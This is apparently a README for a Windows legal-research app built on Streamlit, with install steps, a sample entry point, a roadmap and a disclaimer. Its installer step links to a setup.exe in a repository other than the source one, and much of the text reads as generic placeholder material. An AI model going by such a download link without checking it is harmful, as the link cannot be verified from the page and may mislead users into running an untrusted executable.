# Legal Insight

AI-powered desktop application for retrieving relevant laws, sections, and concise legal summaries from natural-language queries or PDF documents.

---

[![License](https://img.shields.io/github/license/tzykv1n/legal-insight)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Windows-blue)
![Built with](https://img.shields.io/badge/framework-Streamlit-red)
![Language](https://img.shields.io/badge/language-Python-green)

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Screenshots](#screenshots)
- [Installation](#installation)
  - [Using the Windows Installer](#using-the-windows-installer)
  - [Running From Source](#running-from-source)
- [Usage](#usage)
  - [Query Prompts](#query-prompts)
  - [PDF Prompts](#pdf-prompts)
- [Example Code](#example-code)
- [Project Structure](#project-structure)
- [How It Works](#how-it-works)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [FAQ](#faq)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Overview

Legal Insight is a Windows desktop application that helps users identify legally relevant sections based on:

- Plain-text descriptions of cases,
- Uploaded PDFs such as contracts, notices, or pleadings.

The application uses Streamlit for the GUI and backend logic powered by curated legal data and AI models.

It is designed for:

- Students researching legal scenarios,
- Lawyers needing quick statutory references,
- Anyone wanting structured legal insights from a case description.

Legal Insight is intended as an information research tool — not legal advice.

---

## Features

- **Natural-language interpretation**  
  Enter plain-English descriptions of legal scenarios.

- **PDF extraction and analysis**  
  Upload PDFs to extract legal themes and return relevant sections.

- **Concise section summaries**  
  Relevant statutes are summarized for clear understanding.

- **Desktop executable**  
  Distributed as a `.exe` installer that launches the Streamlit interface automatically.

- **Fast and lightweight**  
  Works on any modern Windows machine.

---

## Screenshots

(Add actual images later)

```
docs/images/home.png
docs/images/results.png
```

---

## Installation

### Using the Windows Installer

1. Download the latest release from:  
   **https://github.com/Legal-Insight/lawyer/releases/tag/setup_x32_1.0.1**

2. Run `setup.exe`.

3. After installation, open the installation directory:

```
C:\Program Files\Legal Insight\lawyer
```

4. Run:

```
run.exe
```

5. The application will launch automatically in your default browser.

---

### Running From Source

1. Clone the repository:

```bash
git clone https://github.com/tzykv1n/legal-insight.git
cd legal-insight
```

2. Create a virtual environment:

```bash
python -m venv .venv
.venv\Scripts\activate
```

3. Install dependencies:

```bash
pip install -r requirements.txt
```

4. Run the application:

```bash
streamlit run app.py
```

---

## Usage

### Query Prompts

1. Open the application.

2. Go to the **Query Input** section.

3. Enter your scenario, for example:

   ```
   A tenant has defaulted on rent for 6 months, and the landlord wants to proceed with eviction.
   ```

4. Click **Search**.

5. View relevant laws, sections, and concise explanations.

### PDF Prompts

1. Open the **PDF Insight** section.
2. Upload a PDF (agreements, notices, etc.).
3. Optionally add a guiding query:

   ```
   Identify termination-related provisions.
   ```
4. Click **Analyze**.
5. Results will list relevant sections and short summaries.

---

## Example Code

A minimal Streamlit entry point (structure may differ based on your implementation):

```python
import streamlit as st
from legal_insight.backend import get_legal_insights

st.title("Legal Insight")

query = st.text_area("Describe your case or scenario")
pdf_file = st.file_uploader("Upload PDF", type=["pdf"])

if st.button("Analyze"):
    with st.spinner("Processing..."):
        insights = get_legal_insights(query=query, pdf=pdf_file)

    st.subheader("Relevant Laws and Sections")
    for item in insights:
        st.markdown(f"**{item['section']}** – {item['title']}")
        st.write(item['summary'])
        st.markdown("---")
```

---

## Project Structure

```
legal-insight/
├── app.py
├── legal_insight/
│   ├── backend.py
│   ├── parsing.py
│   ├── models/
│   └── data/
├── requirements.txt
├── LICENSE
├── README.md
└── docs/
    └── images/
```

---

## How It Works

1. User submits text and/or PDF.
2. Text is extracted and preprocessed.
3. The backend matches content to known statutes using:

   * embeddings,
   * search algorithms,
   * curated legal document datasets.
4. Relevant laws and sections are retrieved.
5. Summaries are generated explaining relevance.
6. Results are presented through the Streamlit interface.

---

## Roadmap

* [ ] Export results to PDF
* [ ] Support additional jurisdictions
* [ ] Save query history
* [ ] Offline mode (where licensing permits)
* [ ] Section filtering by category (criminal, civil, property, etc.)
* [ ] More advanced PDF parsing and section mapping

---

## Contributing

Contributions are welcome.

1. Fork the repository.
2. Create a feature branch.
3. Make changes and ensure the application runs correctly.
4. Submit a pull request with a clear description.

---

## FAQ

**Does this replace a lawyer?**  
No. It provides legal information, not legal advice.

**Do I need the internet?**  
Depends on your backend configuration.

**What jurisdictions are supported?**  
Depends on your legal database sources.

**Which OS is supported?**  
Windows (via executable). Source version works on any OS with Python/Streamlit.

---

## Disclaimer

Legal Insight provides automated legal information. It is not legal advice, does not create an attorney–client relationship, and should not be used as the sole basis for legal decisions.

---

## License

This project is under the **MIT License**.  
See the [LICENSE](LICENSE) file for details.
